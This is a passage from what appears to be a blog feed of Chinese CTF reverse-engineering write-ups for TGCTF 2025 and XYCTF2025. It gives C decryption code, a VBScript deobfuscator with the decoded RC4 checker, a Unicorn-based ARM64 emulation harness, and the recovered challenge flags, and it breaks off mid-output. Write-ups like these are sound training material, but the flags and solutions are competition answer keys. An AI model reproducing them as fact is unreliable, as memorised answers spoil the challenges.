class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x42</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xa3</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xf2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xe2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x0b</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x76</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xb0</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0xdc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Dec_2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *_Input_, <span class="type">unsigned</span> <span class="type">char</span> *_Key_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> iVar1 = (<span class="type">int</span>)_Key_[c] &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    DWORD uVar2 = (<span class="type">int</span>)_Key_[c] &amp; <span class="number">0xf</span>;</span><br><span class="line">    c++;</span><br><span class="line">    <span class="built_in">unnamed_function_10</span>(box_ori, (<span class="type">int</span>)*(<span class="type">char</span> *)(iVar1 * <span class="number">0x10</span> + (<span class="type">unsigned</span> <span class="type">char</span> *)box + uVar2));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> key_o[] = <span class="string">&quot;TGCTF404&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        _Input_[i] = _Input_[i] ^ box_ori2[iVar1 * <span class="number">0x10</span> + i * <span class="number">0x11</span> + uVar2];</span><br><span class="line">        _Input_[i] = _Input_[i] ^ key_o[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *_Input_, <span class="type">int</span> _length_)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;TGCTF404&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        Key[i] ^= <span class="number">0x51</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; _length_; i += <span class="number">4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">Dec_2</span>((<span class="type">unsigned</span> <span class="type">char</span> *)(_Input_ + i), Key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x194</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> swaps[<span class="number">32</span>][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> Value = <span class="built_in">rand</span>();</span><br><span class="line">        Value = i + Value / (<span class="number">0x7fff</span> / (<span class="number">32</span> - i) + <span class="number">1</span>);</span><br><span class="line">        swaps[i][<span class="number">0</span>] = i;</span><br><span class="line">        swaps[i][<span class="number">1</span>] = Value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> temp = _Input_[swaps[i][<span class="number">0</span>]];</span><br><span class="line">        _Input_[swaps[i][<span class="number">0</span>]] = _Input_[swaps[i][<span class="number">1</span>]];</span><br><span class="line">        _Input_[swaps[i][<span class="number">1</span>]] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Key[] = <span class="string">&quot;TGCTF404&quot;</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Enc_flag[<span class="number">32</span>]&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">        Enc_flag[i] = *(<span class="type">int</span> *)((byte *)Enc + i * <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decrypt</span>(Enc_flag, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, Enc_flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{f898-de85-46e-9e43-b9c8}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TGCTF-2025-逆向WP&quot;&gt;&lt;a href=&quot;#TGCTF-2025-逆向WP&quot; class=&quot;headerlink&quot; title=&quot;TGCTF 2025 逆向WP&quot;&gt;&lt;/a&gt;TGCTF 2025 逆向WP&lt;/h1&gt;&lt;p&gt;战队名：不知道&lt;/p&gt;
&lt;p&gt;排名：</summary>
      
    
    
    
    
    <category term="CTF比赛" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>XYCTF2025</title>
    <link href="https://tkazer.github.io/2025/04/07/XYCTF2025/"/>
    <id>https://tkazer.github.io/2025/04/07/XYCTF2025/</id>
    <published>2025-04-07T10:30:03.000Z</published>
    <updated>2025-04-22T10:39:58.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XYCTF2025-逆向WP"><a href="#XYCTF2025-逆向WP" class="headerlink" title="XYCTF2025 逆向WP"></a>XYCTF2025 逆向WP</h1><p>虽然这次失去Web手，但是配合新来的师傅，小队的队员们也一起努力打了不错的成绩。</p><p>墨水师傅的MDriver题也是拼尽全力无法战胜（，总体逆向题的质量挺不错的，没什么烂活，值得一试。</p><h2 id="WARMUP"><a href="#WARMUP" class="headerlink" title="WARMUP"></a>WARMUP</h2><p>网上抄的VBS解密代码</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> Defuscator(vbs)</span><br><span class="line">    <span class="keyword">Dim</span> t</span><br><span class="line">    t = InStr(<span class="number">1</span>, vbs, <span class="string">&quot;Execute&quot;</span>, <span class="number">1</span>)</span><br><span class="line">    t = <span class="keyword">Mid</span>(vbs, t + Len(<span class="string">&quot;Execute&quot;</span>))</span><br><span class="line">    t = Eval(t)</span><br><span class="line">    Defuscator = t</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> fso, i, outFile</span><br><span class="line"><span class="keyword">Const</span> ForReading = <span class="number">1</span>, ForWriting = <span class="number">2</span></span><br><span class="line"><span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27; 创建或打开一个文件用于写入输出</span></span><br><span class="line">    <span class="keyword">Set</span> outFile = fso.OpenTextFile(<span class="string">&quot;output.txt&quot;</span>, ForWriting, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> WScript.Arguments.Count - <span class="number">1</span></span><br><span class="line">        <span class="keyword">Dim</span> FileName</span><br><span class="line">        FileName = WScript.Arguments(i)</span><br><span class="line">        <span class="keyword">Dim</span> MyFile</span><br><span class="line">        <span class="keyword">Set</span> MyFile = fso.OpenTextFile(FileName, ForReading)</span><br><span class="line">            <span class="keyword">Dim</span> vbs</span><br><span class="line">            vbs = MyFile.ReadAll</span><br><span class="line">            outFile.WriteLine Defuscator(vbs)</span><br><span class="line">            MyFile.Close</span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">        outFile.Close</span><br><span class="line">        <span class="keyword">Set</span> fso = <span class="literal">Nothing</span></span><br></pre></td></tr></table></figure><p>output.txt:</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;Dear CTFER. Have fun in XYCTF 2025!&quot;</span></span><br><span class="line">flag = InputBox(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;XYCTF&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span> <span class="comment">&#x27; 棰勮鐨凴C4鍔犲瘑缁撴灉锛堝崄鍏繘鍒舵牸寮忥級</span></span><br><span class="line">qwfe = <span class="string">&quot;rc4key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; 淇鍚庣殑RC4鍔犲瘑鍑芥暟</span></span><br><span class="line"><span class="keyword">Function</span> RunRC(sMessage, strKey)</span><br><span class="line">    <span class="keyword">Dim</span> kLen, i, j, temp, pos, outHex</span><br><span class="line">    <span class="keyword">Dim</span> s(<span class="number">255</span>), k(<span class="number">255</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 鍒濆鍖栧瘑閽?</span></span><br><span class="line">    kLen = Len(strKey)</span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        s(i) = i</span><br><span class="line">        k(i) = Asc(<span class="keyword">Mid</span>(strKey, (i <span class="built_in">Mod</span> kLen) + <span class="number">1</span>, <span class="number">1</span>)) <span class="comment">&#x27; 瀵嗛挜浣跨敤ASCII缂栫爜</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; KSA瀵嗛挜璋冨害</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        j = (j + s(i) + k(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; PRGA鍔犲瘑娴佺▼</span></span><br><span class="line">    i = <span class="number">0</span> : j = <span class="number">0</span> : outHex = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">For</span> pos = <span class="number">1</span> <span class="keyword">To</span> Len(sMessage)</span><br><span class="line">        i = (i + <span class="number">1</span>) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        j = (j + s(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">        </span><br><span class="line">        <span class="comment">&#x27; 鍔犲瘑骞惰浆涓哄崄鍏繘鍒?</span></span><br><span class="line">        <span class="keyword">Dim</span> plainChar, cipherByte</span><br><span class="line">        plainChar = Asc(<span class="keyword">Mid</span>(sMessage, pos, <span class="number">1</span>)) <span class="comment">&#x27; 鏄庢枃鎸堿SCII澶勭悊</span></span><br><span class="line">        cipherByte = s((s(i) + s(j)) <span class="built_in">Mod</span> <span class="number">256</span>) <span class="built_in">Xor</span> plainChar</span><br><span class="line">        outHex = outHex &amp; Right(<span class="string">&quot;0&quot;</span> &amp; Hex(cipherByte), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    RunRC = outHex</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; 涓婚獙璇侀€昏緫</span></span><br><span class="line"><span class="keyword">If</span> LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RC4解密，密钥为<strong>rc4key</strong></p><p><img src="/2025/04/07/XYCTF2025/1.png"></p><p>flag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wn‘s_chall_is_r3@lly_gr3@t_&amp;_fuN!}</p><h2 id="ezVM"><a href="#ezVM" class="headerlink" title="ezVM"></a>ezVM</h2><p>通过字符串界面里的unicorn和加密函数的一些特征发现是使用了unicorn框架调用了一串代码。</p><p>找一个使用unicorn框架的程序进行bindiff恢复一些unicorn函数的符号。</p><p>发现是调用了一串ARM64的代码字节进行模拟执行，将输入字符串传入加密返回，并附上了一些data和栈空间初始化。</p><p><img src="/2025/04/07/XYCTF2025/2.png"></p><p><img src="/2025/04/07/XYCTF2025/4.png"></p><p>将以上调用write写入的数据提取，随便找一个ARM64框架的.so复制到对应地址，以便反编译看代码。</p><p>最后得到一个函数，很清晰的看出里面是一个VM虚拟机执行的流程。</p><p><img src="/2025/04/07/XYCTF2025/5.png"></p><p>使用c++编写代码调用unicorn库进行模拟。</p><p>使用Hook，在关键计算地址处进行Hook，输出各个计算流程以及数据。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;data.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unicorn/unicorn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;unicorn-import.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">hook_code</span><span class="params">(uc_engine* uc, <span class="type">uint64_t</span> address, <span class="type">uint32_t</span> size, <span class="type">void</span>* user_data)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> w0,w1,w2,w3,w4;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1fac</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 ^ W0 --- %llx ^ %llx = %llx\n&quot;</span>, w1,w0,w1^w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2BE4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 &gt;&gt; W0 --- %llx &gt;&gt; %llx = %llx\n&quot;</span>, w1, w0, w1 &gt;&gt; w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2DB4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 &lt;&lt; W0 --- %llx &lt;&lt; %llx = %llx\n&quot;</span>, w1, w0, w1 &lt;&lt; w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x232C</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 &amp; W3 --- %llx &amp; %llx = %llx\n&quot;</span>, w0, w3, w0 &amp; w3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2054</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n&quot;</span>, w0, w3, w3 ^ w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2238</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n&quot;</span>, w0, w3, w3 ^ w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2180</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W4, &amp;w4);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W1 = W1 ^ W4 --- %llx ^ %llx = %llx\n&quot;</span>, w1, w4, w1 ^ w4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1CC4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W1 + W0 --- %llx + %llx = %llx\n&quot;</span>, w1, w0, w1 + w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1A0C</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W1 + W0 --- %llx + %llx = %llx\n&quot;</span>, w1, w0, w1 + w0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> Input[] = <span class="string">&quot;11112222111111111111111111111111&quot;</span>;</span><br><span class="line">    uc_engine* uc&#123;&#125;;</span><br><span class="line">    uc_hook hook;</span><br><span class="line">    <span class="type">uint64_t</span> InputAddr = <span class="number">0x14C28</span>;</span><br><span class="line">    <span class="type">uint64_t</span> Stack = <span class="number">0x7F0000</span>;</span><br><span class="line">    <span class="type">uint8_t</span> MyEncFlag[<span class="number">100</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">uint64_t</span> Base = <span class="number">0x0000000001000000</span>;</span><br><span class="line">    <span class="built_in">uc_open</span>(uc_arch::UC_ARCH_ARM64, uc_mode::UC_MODE_ARM, &amp;uc);</span><br><span class="line">    <span class="built_in">uc_mem_map</span>(uc, <span class="number">0</span>, Base, UC_PROT_ALL);</span><br><span class="line">    <span class="built_in">uc_mem_map</span>(uc, Stack - <span class="number">4096</span>, <span class="number">0x4000</span>, UC_PROT_ALL);</span><br><span class="line">    <span class="built_in">uc_hook_add</span>(uc, &amp;hook, UC_HOOK_CODE, hook_code, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x14C28</span>, (LPVOID)&amp;Input, <span class="number">0x20u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x0C70</span>, (LPVOID)&amp;Code, <span class="number">8840u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x14010</span>, (LPVOID)Data1, <span class="number">0x9B8u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x30F0</span>, (LPVOID)&amp;Data2, <span class="number">0x54u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x149E8</span>, (LPVOID)&amp;Data3, <span class="number">8u</span>);</span><br><span class="line">    <span class="built_in">uc_reg_write</span>(uc, <span class="number">0xC7</span>, (LPVOID)&amp;InputAddr);<span class="comment">// X0</span></span><br><span class="line">    <span class="built_in">uc_reg_write</span>(uc, <span class="number">4</span>, (LPVOID)&amp;Stack);       <span class="comment">// SP</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">uc_emu_start</span>(uc, <span class="number">0x0C70</span>, <span class="number">0x2EF4</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_mem_read</span>(uc, InputAddr, &amp;MyEncFlag, <span class="number">48</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%X &quot;</span>, MyEncFlag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">uc_close</span>(uc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后运行输出得到一个vm加密流程</p><p>以下是部分输出内容。</p><p>output:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 